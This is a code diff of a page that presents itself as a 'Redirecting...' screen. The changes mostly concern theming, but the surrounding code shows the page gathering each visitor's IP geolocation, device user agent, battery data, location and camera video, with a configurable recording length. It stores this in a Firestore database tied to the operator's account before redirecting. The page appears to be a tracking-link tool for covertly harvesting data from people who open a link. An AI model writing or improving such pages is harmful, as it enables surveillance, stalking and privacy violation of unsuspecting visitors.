@@ -1,4 +1,4 @@
---- START OF FILE redirect (13).html ---
+<!-- redirect.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,9 +6,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <style>
-         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f3f7fa; color: #333; transition: background-color 0.5s, color 0.5s; background-size: cover; background-position: center; }
-        .container { text-align: center; padding: 40px; background-color: white; border-radius: 12px; box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1); width: 80%; max-width: 500px; transition: background-color 0.5s, box-shadow 0.5s; }
-        h1 { color: #007bff; margin-bottom: 20px; transition: color 0.5s; }
+         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f3f7fa; /* Default background */ color: #333; /* Default text color */ transition: background-color 0.5s, color 0.5s; background-size: cover; background-position: center; }
+        .container { text-align: center; padding: 40px; background-color: white; /* Default container bg */ border-radius: 12px; box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1); width: 80%; max-width: 500px; transition: background-color 0.5s, box-shadow 0.5s; }
+        h1 { color: #007bff; /* Default heading color */ margin-bottom: 20px; transition: color 0.5s; }
         p { font-size: 1rem; margin-bottom: 15px; transition: color 0.5s; }
         .loading-dots::after { content: ""; animation: dots 1s steps(4) infinite; }
         .error-message { color: #dc3545; margin-top: 20px; font-weight: bold; transition: color 0.5s; }
@@ -16,6 +16,31 @@
         .icon-container { margin-bottom: 20px; }
         .icon-container img { max-width: 100px; }
         .custom-text { font-size: 1.2rem; margin-top: 20px; }
+
+        /* Predefined Themes (within redirect.html) */
+        .theme-dark {
+            background-color: #121212 !important;
+            color: #f8f8f8 !important;
+        }
+        .theme-dark .container {
+            background-color: #1e1e1e !important;
+            box-shadow: 0 8px 16px rgba(255, 255, 255, 0.1) !important;
+        }
+        .theme-dark h1 {
+            color: #00a86b !important;
+        }
+
+        .theme-green {
+            background-color: #e8f5e9 !important;
+            color: #333 !important;
+        }
+        .theme-green .container {
+            background-color: #ffffff !important;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1) !important;
+        }
+        .theme-green h1 {
+            color: #4caf50 !important;
+        }
     </style>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
@@ -65,8 +90,15 @@ async function applyUserTheme() {
         const settingsData = settingsSnap.data();
         const themeName = settingsData.theme || 'default'; // Default to 'default'
 
-        if (themeName === 'default' || themeName === 'dark' || themeName === 'green') {
-           applyThemeRedirect(themeName) //Apply predefined themes
+        if (themeName === 'default') {
+            // Don't need to do anything - default styles are already applied
+            document.body.classList.remove('theme-dark', 'theme-green'); // Remove other classes
+        } else if (themeName === 'dark') {
+            document.body.classList.add('theme-dark'); // Add the class
+            document.body.classList.remove('theme-green'); // Remove other classes
+        } else if (themeName === 'green') {
+            document.body.classList.add('theme-green');
+            document.body.classList.remove('theme-dark'); // Remove other classes
         } else {
             // Load custom theme data
             const themeRef = db.collection('redirectThemes').doc(themeName);
@@ -74,7 +106,7 @@ async function applyUserTheme() {
 
             if (!themeSnap.exists) {
                 console.log(`Custom theme "${themeName}" not found, using default.`);
-                applyThemeRedirect('default'); // Use default styles
+                //  Don't need to remove classes, as we use default in CSS.
                 return;
             }
 
@@ -92,6 +124,7 @@ async function applyUserTheme() {
                 document.getElementById('custom-redirect-text').textContent = themeData.customText;
                 document.getElementById('custom-redirect-text').style.display = 'block';
             }
+             document.body.classList.remove('theme-dark', 'theme-green');
         }
 
     } catch (error) {
@@ -118,9 +151,6 @@ async function getIPLocationData() {
     try { return await (await fetch('https://ipapi.co/json/')).json(); } catch (error) { console.error('IP Error:', error); return null; }
 }
 function getDeviceInfo() { return navigator.userAgent; }
-
-// No longer needed.
-//async function applyThemeRedirect(themeName) {}
 
 async function collectOtherData(locationPermission, currentVideoUrl, currentCameraError) {
     let locationData = null;
@@ -268,7 +298,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         const currentUserId = await getCurrentUserId();
         const settingsRef = db.collection('userSettings').doc(currentUserId);
         const settingsSnap = await settingsRef.get();
-        let micCamPermission =  false, recordSeconds = 0, notificationPermissionSetting = false, themeName = 'default';
+        let micCamPermission = false, recordSeconds = 0, notificationPermissionSetting = false, themeName = 'default';
 
         if (settingsSnap.exists) {
             ({ micCamPermission, recordSeconds, notificationPermission: notificationPermissionSetting, theme: themeName = 'default' } = settingsSnap.data());
@@ -305,26 +335,6 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         errorMessage.style.display = 'block';
     }
 })();
-
-    //Added to apply the theme styles
-function applyThemeRedirect(themeName) {
-    const theme = themes[themeName] || themes.default;
-    document.body.style.backgroundColor = theme.bodyBackgroundColor;
-    document.body.style.color = theme.textColor;
-    const container = document.querySelector('.container');
-    if (container) {
-        container.style.backgroundColor = theme.containerBackgroundColor;
-        container.style.boxShadow = theme.containerBoxShadow;
-    }
-    const h1 = document.querySelector('h1');
-    if (h1) {
-        h1.style.color = theme.headingColor;
-    }
-     const p = document.querySelectorAll('p');
-    p.forEach(pElement => {
-        pElement.style.color = theme.textColor;
-    });
-}
 </script>
 </body>
 </html>
